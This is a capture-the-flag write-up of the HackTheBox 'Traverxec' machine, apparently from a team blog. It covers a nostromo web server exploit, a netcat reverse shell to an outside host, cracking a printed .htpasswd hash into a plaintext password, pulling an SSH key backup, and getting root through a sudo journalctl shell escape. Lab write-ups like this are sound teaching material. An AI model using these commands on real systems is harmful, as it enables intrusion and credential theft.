---
title: Traverxec
layout: post
author: Bit Criminals Team
date: 2021-08-01 14:00:00 +0530
type: Pentesting
difficulty: Easy
prompt: https://app.hackthebox.eu/machine/Traverxec
---

## Nmap scan

![](/images/leo/traverxec1.png)

## Exploit

On googling nostromo exploit we find <https://www.exploit-db.com/exploits/47837>
Downloading and using the exploit we are successfully able to run commands

![](/images/leo/traverxec2.png)

## Shell

Now we can get a interactive shell using the command ```nc -e /bin/sh 10.0.0.1 1234```

![](/images/leo/traverxec3.png)

And we have a shell.
Now  we use the command ```python -c 'import pty; pty.spawn("/bin/bash")'``` to stabilize the shell

## Creds

On enumerating through the system we find ```/var/nostromo/conf```

![](/images/leo/traverxec4.png)

Opening the ```.httpasswd``` file

We find ```david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/```

Using john to crack the hash 
``` 
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
We get ```david:Nowonly4me```

## SSH

Reading the last line of the ```nhttpd.conf file```
```
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```
We find that /home points nostromo to the home directory of the user and then in the directory the webroot is public_www

```
www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www
cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls
ls
index.html  protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area
cd protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
ls
backup-ssh-identity-files.tgz
```
Now we just need to download the ```backup-ssh-identity-files.tgz```

```
wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
```
## Cracking the key

Once we have the file we open it using
```
tar -zxvf backup-ssh-identity-files.tgz
```
And we have david's home directory along with his private ssh key
We find the passphrase using

![](/images/leo/travexec5.png)

Now we can ssh as david 
```
ssh -i id_rsa david@10.10.10.165
```
## david --> root

We find ```server-stats.sh``` in the bin directory

![](/images/leo/traverxec6.png)

The last line runs journalctl with sudo and if we are able to run the script that means we have sudo permission over journalctl

On searching for journalctl on gtfobins we find 
```
sudo journalctl
!/bin/sh
```
![](/images/leo/traverxec7.png) 